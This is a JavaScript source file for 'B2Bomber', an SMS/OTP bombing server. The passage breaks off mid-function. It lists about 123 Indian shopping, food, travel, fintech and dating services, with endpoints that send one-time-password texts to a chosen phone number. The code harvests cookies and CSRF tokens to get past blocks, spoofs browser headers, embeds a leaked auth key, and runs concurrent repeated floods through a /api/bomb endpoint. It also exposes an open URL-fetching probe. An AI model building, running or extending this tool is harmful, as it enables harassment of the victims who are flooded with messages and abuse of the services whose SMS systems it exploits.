/**
 * ============================================================
 *  B2Bomber v4 — multi-site OTP sender
 *  auto-discovery (multi-path) · strict detection · fast
 *  Node 18+ / 20 · ESM · Render-ready
 * ============================================================
 *    GET  /api/health
 *    GET  /api/diag
 *    GET  /api/services
 *    GET  /api/probe?url=
 *    GET  /api/selftest?number=   (discovery + bench)
 *    POST /api/stats/reset
 *    POST /api/bomb               (NDJSON stream)
 * ============================================================
 */
import express from 'express';
import path from 'node:path';
import crypto from 'node:crypto';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const PORT        = Number(process.env.PORT || 3000);
const HOST        = '0.0.0.0';
const TIMEOUT_MS  = Number(process.env.OTP_TIMEOUT_MS || 4500);
const WARM_MS     = Number(process.env.OTP_WARM_MS || 3500);
const CONCURRENCY = Number(process.env.OTP_CONCURRENCY || 30);
const STAGGER_MS  = Number(process.env.OTP_STAGGER_MS || 25);
const BENCH_AFTER = Number(process.env.OTP_BENCH_AFTER || 3);
const MAX_RUN_MS  = Number(process.env.OTP_MAX_RUN_MS || 150000);
const HB_MS       = 7000;

process.on('unhandledRejection', e => console.error('[unhandledRejection]', e));
process.on('uncaughtException',  e => console.error('[uncaughtException]', e));

/* ------------------------------ utils ----------------------------- */
const sleep = ms => new Promise(r => setTimeout(r, ms));

function hardTimeout(p, ms) {
  let t;
  return Promise.race([
    p,
    new Promise((_, rej) => { t = setTimeout(() => rej(Object.assign(new Error('timeout'), { name: 'TimeoutError' })), ms); }),
  ]).finally(() => clearTimeout(t));
}

const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36';

const JSONH = {
  'content-type': 'application/json',
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  'user-agent': UA,
};
const FORMH = {
  'content-type': 'application/x-www-form-urlencoded',
  'accept': 'application/json, text/plain, */*',
  'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
  'user-agent': UA,
};

function makeCtx(number) {
  let d = String(number || '').replace(/\D/g, '');
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  if (d.length === 10) d = '91' + d;
  const ten = d.slice(-10);
  return { full: d, ten, plus: '+' + d, rnd: () => crypto.randomBytes(4).toString('hex') };
}

const safeOrigin = u => { try { return new URL(u).origin; } catch { return ''; } };

/* ------------------------ cookie warm-up -------------------------- */
const warmCache = new Map();

function extractCsrf(html) {
  if (!html) return '';
  const m =
    html.match(/name=["']csrf-token["'][^>]*content=["']([^"']+)["']/i) ||
    html.match(/content=["']([^"']+)["'][^>]*name=["']csrf-token["']/i) ||
    html.match(/"csrfToken"\s*:\s*"([^"]+)"/i);
  return m ? m[1] : '';
}

function warmOnce(origin) {
  if (!origin) return Promise.resolve({ cookie: '', csrf: '' });
  const hit = warmCache.get(origin);
  if (hit && Date.now() - hit.at < 10 * 60_000) return hit.p;

  const p = (async () => {
    try {
      const res = await fetch(origin + '/', {
        headers: {
          'user-agent': UA,
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'accept-language': 'en-IN,en-GB;q=0.9,en;q=0.8',
        },
        redirect: 'follow',
        signal: AbortSignal.timeout(WARM_MS),
      });
      let html = '';
      try { html = await res.text(); } catch {}
      const list = typeof res.headers.getSetCookie === 'function' ? res.headers.getSetCookie() : [];
      const parts = [];
      for (const c of list) {
        const first = String(c).split(';')[0].trim();
        if (first.includes('=')) parts.push(first);
      }
      return { cookie: parts.join('; '), csrf: extractCsrf(html) };
    } catch { return { cookie: '', csrf: '' }; }
  })();

  warmCache.set(origin, { p, at: Date.now() });
  return p;
}

/* ------------------------ success judge --------------------------- */
const BAD = /(invalid token|invalid otp|unauthor|not allowed|access denied|attempt exceeded|"status":0|"status":"error"|"success":false|"error":"[^"]+")/i;

function judge(status, body, ct) {
  if (status < 200 || status >= 400) return { ok: false, why: 'HTTP ' + status };
  const html = /^\s*<(!doctype|html)/i.test(body) || /text\/html/i.test(ct);
  if (html) return { ok: false, why: 'html page (soft-404)' };
  const bad = body.match(BAD);
  if (bad) return { ok: false, why: 'body: ' + bad[0] };
  return { ok: true, why: '' };
}

/* ------------------------ service model --------------------------- */
const COMMON = [
  '/api/v1/otp/send',
  '/api/otp/send',
  '/api/v1/auth/sendOtp',
  '/api/auth/send-otp',
  '/api/v1/user/send_otp',
  '/api/user/sendOtp',
  '/api/v1/send-otp',
  '/sendOtp',
];

const S = (id, name, urls, body, o = {}) => ({
  id, name,
  urls: [].concat(urls),
  method: o.method || 'POST',
  form: !!o.form,
  common: !!o.common,
  warm: o.warm !== false,
  headers: o.headers || {},
  body: body || null,
});

/* ================================================================== *
 *  SERVICES  (123)
 * ================================================================== */
const SERVICES = [
  /* ---- aapke capture se (pakka path) ---- */
  S('redbus', 'RedBus', 'https://www.redbus.in/rpw/api/sendOtpV2',
    c => ({ phoneCode: '91', mobile: c.ten, reCaptchaResponse: '', whatsappOptin: true })),

  S('blinkit', 'Blinkit', 'https://blinkit.com/v2/accounts/',
    c => `user_phone=${c.ten}`, { form: true, headers: {
      auth_key: 'c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477',
      device_id: '2f017ff841730f22', app_client: 'consumer_web', platform: 'mobile_web',
      session_uuid: '27c74e4f-ef1c-4c5b-aee0-d4d9f9f00b03' } }),

  S('nykaa', 'Nykaa',
    ['https://www.nykaa.com/app-api/index.php/customer/send_otp', 'https://www.nykaa.com/app-api/index.php?a=sendOtp'],
    c => `platform=web&mobile_number=${c.ten}`,
    { form: true, headers: { 'x-csrf-token': c => c.csrf || 'plItKXf7zbGkMlOj' } }),

  /* ---- pehle se real JSON de rahi hain ---- */
  S('treebo', 'Treebo', 'https://www.treebo.com/api/v2/auth/login/otp/', c => ({ mobile: c.ten })),
  S('unacademy', 'Unacademy', 'https://unacademy.com/api/v1/user/get_app_link/', c => ({ phone: c.ten })),
  S('cashify', 'Cashify', c => `https://www.cashify.in/api/cu01/v1/app-link?mobile=${c.ten}`, null, { method: 'GET' }),
  S('magicbricks', 'MagicBricks', c => `https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=${c.ten}`, null, { method: 'GET' }),
  S('gapoon', 'Gapoon', 'https://www.gapoon.com/userSignup', c => `mobile=${c.ten}`, { form: true }),
  S('allensolly', 'Allen Solly', 'https://www.allensolly.com/capillarylogin/validateMobileOrEMail', c => `mobile=${c.ten}`, { form: true }),
  S('pharmeasy', 'PharmEasy', ['https://pharmeasy.in/api/auth/requestOTP', 'https://pharmeasy.in/api/v1/auth/requestOTP'], c => ({ phone: c.ten })),

  /* ---- shopping ---- */
  S('flipkart', 'Flipkart',
    ['https://www.flipkart.com/api/6/user/signup/send_otp', 'https://www.flipkart.com/api/5/user/otp/generate'],
    c => ({ loginId: c.ten, otp: '', loginType: 'MOBILE' }),
    { headers: { 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 FKUA/website/42/website/Desktop' } }),
  S('myntra', 'Myntra', 'https://www.myntra.com/gateway/v2/user/otp/send', c => ({ mobile: c.full }), { headers: { 'x-myntraweb': 'Yes' } }),
  S('ajio', 'Ajio', ['https://login.web.ajio.com/api/auth/signupSendOTP', 'https://www.ajio.com/api/auth/signupSendOTP'], c => ({ mobile: c.ten })),
  S('meesho', 'Meesho', ['https://www.meesho.com/api/v1/users/send_otp'], c => ({ phone_number: c.plus }), { common: true }),
  S('snapdeal', 'Snapdeal', ['https://www.snapdeal.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('tatacliq', 'Tata CLiQ', ['https://www.tatacliq.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('jiomart', 'JioMart', ['https://www.jiomart.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('croma', 'Croma', ['https://www.croma.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('bigbasket', 'BigBasket', ['https://www.bigbasket.com/api/v2/otp/generate'], c => ({ mobile: c.ten }), { common: true }),
  S('pepperfry', 'Pepperfry', ['https://www.pepperfry.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('firstcry', 'FirstCry', ['https://www.firstcry.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('purplle', 'Purplle', ['https://www.purplle.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('mamaearth', 'Mamaearth', ['https://www.mamaearth.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('boat', 'boAt', ['https://www.boat-lifestyle.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('zepto', 'Zepto', ['https://api.zeptonow.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('tatanue', 'Tata Neu', ['https://www.tataneu.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('reliancedigital', 'Reliance Digital', ['https://www.reliancedigital.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('vijaysales', 'Vijay Sales', ['https://www.vijaysales.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('nykaafashion', 'Nykaa Fashion', ['https://www.nykaafashion.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('nnnow', 'NNNow', ['https://api.nnnow.com/d/api/appDownloadLink'], c => ({ mobileNumber: c.ten })),
  S('lenskart', 'Lenskart', ['https://www.lenskart.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('bewakoof', 'Bewakoof', ['https://www.bewakoof.com/api/v1/user/otp'], c => `mobile=${c.ten}`, { form: true }),

  /* ---- food ---- */
  S('zomato', 'Zomato', ['https://www.zomato.com/webroutes/auth/sendOtp'], c => ({ phone: c.plus, country_code: '91' })),
  S('swiggy', 'Swiggy', ['https://www.swiggy.com/dapi/auth/sms/otp', 'https://www.swiggy.com/api/sms/otp'], c => ({ mobile: c.plus, deviceId: c.rnd() })),
  S('dominos', 'Dominos', ['https://www.dominos.co.in/api/customer/send-otp'], c => ({ mobile: c.ten }), { common: true }),
  S('pizzahut', 'Pizza Hut', ['https://www.pizzahut.co.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('burgerking', 'Burger King', ['https://www.burgerking.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('wowmomo', 'Wow Momo', ['https://www.wowmomo.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('eatsure', 'EatSure', ['https://www.eatsure.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('chaayos', 'Chaayos', ['https://www.chaayos.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('thirdwave', 'Third Wave', ['https://www.thirdwavecoffeeroasters.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('bluetokai', 'Blue Tokai', ['https://bluetokaicoffee.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('licious', 'Licious', ['https://www.licious.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('freshtohome', 'FreshToHome', ['https://www.freshtohome.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- travel ---- */
  S('makemytrip', 'MakeMyTrip', ['https://www.makemytrip.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('goibibo', 'Goibibo', ['https://www.goibibo.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('yatra', 'Yatra', ['https://www.yatra.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('abhibus', 'AbhiBus', ['https://www.abhibus.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('oyorooms', 'OYO', ['https://www.oyorooms.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('easemytrip', 'EaseMyTrip', ['https://www.easemytrip.com/api/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('cleartrip', 'Cleartrip', ['https://www.cleartrip.com/api/v2/user/mobile/sendOtp'], c => ({ mobile: c.full })),
  S('confirmtkt', 'ConfirmTkt', c => `https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=${c.ten}&countryCode=91`, null, { method: 'GET' }),
  S('ixigo', 'Ixigo', ['https://www.ixigo.com/api/v3/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('railyatri', 'RailYatri', ['https://www.railyatri.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('happyeasygo', 'HappyEasyGo', c => `https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do?phoneNumber=${c.full}&countryCode=91`, null, { method: 'GET' }),

  /* ---- rides & local ---- */
  S('porter', 'Porter', ['https://porter.in/restservice/send_app_link_sms'], c => `phone_number=${c.ten}`, { form: true }),
  S('cityflo', 'Cityflo', ['https://cityflo.com/website-app-download-link-sms/'], c => `phone=${c.ten}`, { form: true }),
  S('mylescars', 'Myles', ['https://www.mylescars.com/usermanagements/chkContact'], c => `contact=${c.ten}`, { form: true }),
  S('ola', 'Ola', ['https://api.olacabs.com/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('rapido', 'Rapido', ['https://api.rapido.bike/api/v1/auth/sendOtp'], c => ({ mobile: c.ten }), { common: true }),
  S('blusmart', 'BluSmart', ['https://www.blusmart.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('dunzo', 'Dunzo', ['https://www.dunzo.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('urbancompany', 'Urban Company', ['https://www.urbancompany.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('bounce', 'Bounce', ['https://www.bounceshare.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('yulu', 'Yulu', ['https://www.yulu.bike/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- real estate & auto ---- */
  S('nobroker', 'NoBroker', ['https://www.nobroker.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('p99acres', '99acres', ['https://www.99acres.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('sulekha', 'Sulekha', ['https://www.sulekha.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('housing', 'Housing', ['https://login.housing.com/api/v2/send-otp'], c => ({ phone: c.full })),
  S('makaan', 'Makaan', c => `https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/${c.full}`, null, { method: 'GET' }),
  S('justdial', 'JustDial', c => `https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=${c.ten}`, null, { method: 'GET' }),
  S('proptiger', 'PropTiger', ['https://www.proptiger.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('squareyards', 'SquareYards', ['https://www.squareyards.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('cardekho', 'CarDekho', ['https://www.cardekho.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('cars24', 'Cars24', ['https://www.cars24.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('spinny', 'Spinny', ['https://www.spinny.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('carwale', 'CarWale', ['https://www.carwale.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('droom', 'Droom', ['https://www.droom.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- health ---- */
  S('practo', 'Practo', ['https://www.practo.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('cultfit', 'cult.fit', ['https://www.cult.fit/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('medplus', 'MedPlus', ['https://www.medplusmart.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('healthkart', 'HealthKart', ['https://www.healthkart.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('apollo247', 'Apollo 24|7', ['https://www.apollo247.com/api/v1/auth/sendOtp'], c => ({ mobile: c.ten }), { common: true }),
  S('onemg', 'Tata 1mg', ['https://www.1mg.com/api/v1/otp'], c => ({ phone: c.ten }), { common: true }),
  S('netmeds', 'Netmeds', ['https://www.netmeds.com/api/v1/user/otp'], c => ({ mobile: c.ten }), { common: true }),
  S('healthifyme', 'HealthifyMe', ['https://www.healthifyme.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('beato', 'BeatO', ['https://www.beatoapp.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- fintech ---- */
  S('groww', 'Groww', ['https://api.groww.in/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('cred', 'CRED', ['https://api.cred.com/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('khatabook', 'Khatabook', ['https://api.khatabook.com/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('mobikwik', 'MobiKwik', ['https://www.mobikwik.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('navi', 'Navi', ['https://www.navi.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('freecharge', 'Freecharge', ['https://www.freecharge.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('policybazaar', 'PolicyBazaar', ['https://www.policybazaar.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('acko', 'Acko', ['https://www.acko.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('bankbazaar', 'BankBazaar', ['https://www.bankbazaar.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('digit', 'Go Digit', ['https://www.godigit.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('upstox', 'Upstox', ['https://api.upstox.com/v2/login/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('angelone', 'Angel One', ['https://www.angelone.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('coindcx', 'CoinDCX', ['https://api.coindcx.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('wazirx', 'WazirX', ['https://api.wazirx.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('slice', 'Slice', ['https://www.sliceit.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('airtel', 'Airtel', c => `https://www.airtel.in/referral-api/core/notify?msisdn=${c.full}`, null, { method: 'GET' }),
  S('indialends', 'IndiaLends', ['https://indialends.com/internal/a/mobile-verification_v2.ashx'], c => `mobile=${c.ten}`, { form: true }),

  /* ---- education & jobs ---- */
  S('pw', 'PhysicsWallah', ['https://www.pw.live/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('vedantu', 'Vedantu', ['https://www.vedantu.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('byjus', 'Byjus', ['https://www.byjus.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('newtonschool', 'Newton School', ['https://my.newtonschool.co/api/v1/user/otp/'], c => ({ phone: c.ten })),
  S('careers360', 'Careers360', ['https://www.careers360.com/ajax/no-cache/user/otp-send'], c => `mobile=${c.ten}`, { form: true }),
  S('naukri', 'Naukri', ['https://www.naukri.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('internshala', 'Internshala', ['https://internshala.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('apna', 'apna', ['https://apna.co/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('toppr', 'Toppr', ['https://www.toppr.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('upgrad', 'upGrad', ['https://www.upgrad.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- entertainment ---- */
  S('gaana', 'Gaana', ['https://api.gaana.com/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('jiosaavn', 'JioSaavn', ['https://www.jiosaavn.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('hotstar', 'Hotstar', ['https://api.hotstar.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('mxplayer', 'MX Player', ['https://www.mxplayer.in/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('zee5', 'ZEE5', ['https://www.zee5.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('sonyliv', 'SonyLIV', ['https://www.sonyliv.com/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),
  S('dream11', 'Dream11', ['https://api.dream11.com/sendsmslink'], c => ({ phoneNumber: c.full })),
  S('mpl', 'MPL', ['https://www.mpl.live/api/v1/otp/send'], c => ({ mobile: c.ten }), { common: true }),

  /* ---- misc ---- */
  S('tinder', 'Tinder', ['https://api.gotinder.com/v2/auth/sms/send'], c => ({ phone_number: c.plus })),
  S('kfc', 'KFC', ['https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin'], c => `PhoneNumber=${c.ten}`, { form: true }),
  S('grofers', 'Blinkit(old)', ['https://grofers.com/v2/accounts/'], c => ({ phone: c.ten }), { headers: { auth_key: '' } }),
];

/* ------------------------------------------------------------------ *
 * state
 * ------------------------------------------------------------------ */
const health = new Map();   // id -> stats
const goodPath = new Map(); // id -> winning url string

function note(svc, ok, status, ms, force = false) {
  const h = health.get(svc.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
  h.status = status || 0; h.ms = ms || 0;
  if (ok) { h.ok++; h.streak = 0; h.benched = false; }
  else { h.fail++; h.streak++; if (force || h.streak >= BENCH_AFTER) h.benched = true; }
  health.set(svc.id, h);
}

function healthSnapshot() {
  return SERVICES.map(s => {
    const h = health.get(s.id) || { ok: 0, fail: 0, streak: 0, benched: false, status: 0, ms: 0 };
    return { id: s.id, name: s.name, ok: h.ok, fail: h.fail, benched: h.benched, status: h.status, ms: h.ms, path: goodPath.get(s.id) || '' };
  });
}

function expand(svc, ctx) {
  const out = [];
  for (const u of svc.urls) {
    const url = typeof u === 'function' ? u(ctx) : u;
    if (url) out.push({ url });
  }
  if (svc.common && typeof svc.urls[0] === 'string') {
    const o = safeOrigin(svc.urls[0]);
    if (o) for (const p of COMMON) {
      const u = o + p;
      if (!out.some(x => x.url === u)) out.push({ url: u });
    }
  }
  return out;
}

/* ------------------------------------------------------------------ *
 * one raw attempt
 * ------------------------------------------------------------------ */
async function attemptOnce(url, method, headers, body, t0) {
  try {
    const init = { method, headers, redirect: 'follow', signal: AbortSignal.timeout(TIMEOUT_MS) };
    if (method !== 'GET' && body != null) init.body = body;
    const res = await hardTimeout(fetch(url, init), TIMEOUT_MS + 1000);
    const text = await hardTimeout(Promise.resolve(res.text()).catch(() => ''), 3000).catch(() => '');
    const clean = String(text).replace(/\s+/g, ' ').trim();
    const j = judge(res.status, clean, res.headers?.get?.('content-type') || '');
    return { ok: j.ok, why: j.why, status: res.status, snippet: clean.slice(0, 110), ms: Date.now() - t0, url };
  } catch (e) {
    return {
      ok: false, status: 0, snippet: '', ms: Date.now() - t0, url,
      why: e?.name === 'TimeoutError' ? 'timeout' : (e?.message || 'network error'),
    };
  }
}

/* ------------------------------------------------------------------ *
 * sendOne — candidates + cookie retry on 403
 * ------------------------------------------------------------------ */
async function sendOne(svc, ctx) {
  const t0 = Date.now();
  const cached = goodPath.get(svc.id);
  const cands = cached ? [{ url: cached }] : expand(svc, ctx);

  let best = null;

  for (const cand of cands) {
    const url = cand.url;
    const origin = safeOrigin(url);
    const warmP = svc.warm === false ? null : warmOnce(origin);

    const build = (w) => {
      const c2 = { ...ctx, cookie: w?.cookie || '', csrf: w?.csrf || '' };
      const h = {};
      for (const [k, v] of Object.entries(svc.headers || {})) h[k] = typeof v === 'function' ? v(c2) : v;
      if (c2.cookie) h.cookie = c2.cookie;
      if (origin) { if (!h.origin) h.origin = origin; if (!h.referer) h.referer = origin + '/'; }
      let b = null;
      if (svc.method !== 'GET' && typeof svc.body === 'function') {
        const raw = svc.body(ctx);
        b = svc.form ? raw : (typeof raw === 'string' ? raw : JSON.stringify(raw));
      }
      return h && b !== undefined ? { h, b } : { h, b };
    };

    const { h, b } = build(null);
    const headers = { ...(svc.form ? FORMH : JSONH), ...h };
    let r = await attemptOnce(url, svc.method, headers, b, t0);

    // 403 / html -> cookies ke saath dobara
    if ((!r.ok && r.status === 403) && warmP) {
      const w = await warmP.catch(() => null);
      if (w && (w.cookie || w.csrf)) {
        const b2 = build(w);
        const r2 = await attemptOnce(url, svc.method, { ...(svc.form ? FORMH : JSONH), ...b2.h }, b2.b, t0);
        if (r2.ok) r = r2;
      }
    }

    if (!best || (r.ok && !best.ok)) best = r;
    if (r.ok) { if (!cached) goodPath.set(svc.id, url); return best; }
  }

  return best || { ok: false, status: 0, why: 'no candidate', snippet: '', ms: Date.now() - t0, url: '' };
}

/* ------------------------------------------------------------------ *
 * express
 * ------------------------------------------------------------------ */
const app = express();
app.set('trust proxy', 1);
app.disable('x-powered-by');
app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: false, limit: '256kb' }));

app.use((req, res, next) => {
  res.setHeader('access-control-allow-origin', '*');
  res.setHeader('access-control-allow-headers', 'content-type');
  res.setHeader('access-control-allow-methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
app.use((req, _res, next) => { console.log(`${req.method} ${req.url}`); next(); });

app.get('/api/health', (_req, res) => {
  const benched = [...health.values()].filter(h => h.benched).length;
  res.json({
    ok: true, services: SERVICES.length, live: SERVICES.length - benched, benched,
    solved: goodPath.size, node: process.version, uptime: Math.round(process.uptime()),
  });
});

app.post('/api/stats/reset', (_req, res) => {
  health.clear(); goodPath.clear(); warmCache.clear();
  res.json({ ok: true, reset: true });
});

app.get('/api/services', (_req, res) => res.json({ ok: true, count: SERVICES.length, services: healthSnapshot() }));

app.get('/api/probe', async (req, res) => {
  const url = String(req.query.url || '');
  if (!url) return res.status(400).json({ error: 'url required' });
  const t0 = Date.now();
  try {
    const r = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(8000) });
    const t = await r.text().catch(() => '');
    res.json({ ok: true, status: r.status, ms: Date.now() - t0, ct: r.headers.get('content-type'), body: t.slice(0, 600) });
  } catch (e) {
    res.json({ ok: false, ms: Date.now() - t0, error: e?.message });
  }
});

app.get('/api/diag', async (_req, res) => {
  const out = [];
  for (const t of ['https://www.google.com/generate_204', 'https://www.flipkart.com/', 'https://api.github.com/']) {
    const t0 = Date.now();
    try {
      const r = await fetch(t, { signal: AbortSignal.timeout(6000) });
      out.push({ target: t, ok: true, status: r.status, ms: Date.now() - t0 });
    } catch (e) { out.push({ target: t, ok: false, error: e?.message, ms: Date.now() - t0 }); }
  }
  res.json({
    ok: true, node: process.version, platform: process.platform,
    region: process.env.RENDER_REGION || process.env.REGION || 'n/a',
    services: SERVICES.length, solved: goodPath.size, warmed: warmCache.size,
    benched: [...health.entries()].filter(([, h]) => h.benched).map(([id]) => id),
    outbound: out,
  });
});

/* discovery + bench */
app.get('/api/selftest', async (req, res) => {
  const raw = String(req.query.number || '9999999999');
  const ctx = makeCtx(raw.length === 10 ? raw : raw.slice(-10));
  const list = SERVICES.slice();
  const results = [];
  let idx = 0;

  const workers = Array.from({ length: Math.min(CONCURRENCY, list.length) }, async () => {
    while (true) {
      const i = idx++;
      if (i >= list.length) return;
      const svc = list[i];
      const r = await sendOne(svc, ctx);
      note(svc, r.ok, r.status, r.ms, !r.ok);
      results.push({ id: svc.id, name: svc.name, ok: r.ok, status: r.status, ms: r.ms, error: r.why, snippet: r.snippet, url: r.url });
    }
  });
  await Promise.all(workers);

  const ok = results.filter(r => r.ok).length;
  res.json({ ok, total: results.length, benched: results.length - ok, number: ctx.full, results });
});

/* bomber */
app.post('/api/bomb', async (req, res) => {
  try {
    const number = String(req.body?.number || '').replace(/\D/g, '');
    const repeat = Math.min(10, Math.max(1, Number(req.body?.repeat) || 1));
    const skipDead = req.body?.skipDead !== false;
    if (number.length < 10 || number.length > 15) return res.status(400).json({ error: 'invalid number' });

    const ctx = makeCtx(number);
    const active = SERVICES.filter(s => !(skipDead && health.get(s.id)?.benched));
    const skipped = SERVICES.length - active.length;
    const total = active.length * repeat;

    res.writeHead(200, {
      'content-type': 'application/x-ndjson; charset=utf-8',
      'cache-control': 'no-cache, no-transform',
      'x-accel-buffering': 'no',
    });
    res.flushHeaders?.();
    res.setTimeout?.(0);

    let closed = false;
    res.on('close', () => { if (!res.writableEnded) closed = true; });
    res.on('error', () => { closed = true; });

    const emit = o => { if (res.writableEnded) return; try { res.write(JSON.stringify(o) + '\n'); } catch {} };
    const hb = setInterval(() => emit({ type: 'ping' }), HB_MS);
    const finish = o => { clearInterval(hb); emit(o); if (!res.writableEnded) { try { res.end(); } catch {} } };

    emit({ type: 'start', total, services: active.length, repeat, skipped, number: ctx.full });
    if (!total) return finish({ type: 'done', sent: 0, failed: 0, total: 0, done: 0 });

    const tasks = [];
    for (let r = 0; r < repeat; r++) for (const s of active) tasks.push(s);

    const startedAt = Date.now();
    let cursor = 0, done = 0, sent = 0, failed = 0;

    const worker = async () => {
      while (!closed) {
